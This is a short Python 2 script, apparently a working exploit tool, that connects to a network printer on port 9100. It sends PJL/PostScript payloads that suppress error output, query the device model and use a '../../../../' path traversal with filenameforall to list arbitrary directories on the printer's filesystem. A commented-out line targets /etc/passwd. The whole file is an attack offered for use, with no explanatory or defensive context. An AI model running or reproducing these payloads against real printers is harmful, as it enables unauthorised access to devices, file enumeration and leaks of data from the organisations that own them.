#!/usr/bin/python

#usage:
#./ps_ls <ip of printer> <directory to ls>
#./ps_ls 1.1.1.1 etc

import socket
import sys

HOST = '1.1.1.16' 
PORT = 9100

#GETFILE = '/etc/passwd'
HOSTIP = sys.argv[1]
DIRNAME = sys.argv[2]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOSTIP, PORT))
DATA = '1b'.decode("hex") + '%-12345X@PJL ENTER LANGUAGE = POSTSCRIPT\n%!\n/print {(%stdout) (w) file dup 3 2 roll writestring flushfile} def\n/== {128 string cvs print (\\' + '6e'.decode("hex") + ') print} def\n{(x1) = (x2) == << /DoPrintErrors false >> setsystemparams} stopped\n(DELIMITER49414\\' + '6e'.decode("hex") + ') print flush\n'
DATA2 = '1b'.decode("hex") + '%-12345X@PJL ENTER LANGUAGE = POSTSCRIPT\n%!\nproduct print\n(DELIMITER42319\\' + '6e'.decode("hex") + ') print flush\n'
DATA3 = '1b'.decode("hex") + '%-12345X@PJL ENTER LANGUAGE = POSTSCRIPT\n%!\n{false statusdict /setfilenameextend get exec} stopped\n/str 256 string def (%*%../../../../' + DIRNAME + '/**) {print (\\' + '6e'.decode("hex") + ') print} str filenameforall\n(DELIMITER5771\\' + '6e'.decode("hex") + ') print flush\n'

s.send(DATA)
data = s.recv(8192)
dataa = s.recv(8192)

s.send(DATA2)
data2 = s.recv(4096)

s.send(DATA3)
data3 = ""
while "DELIMITER" not in data3:
   data3 = s.recv(131070)
   print data3,




s.close()


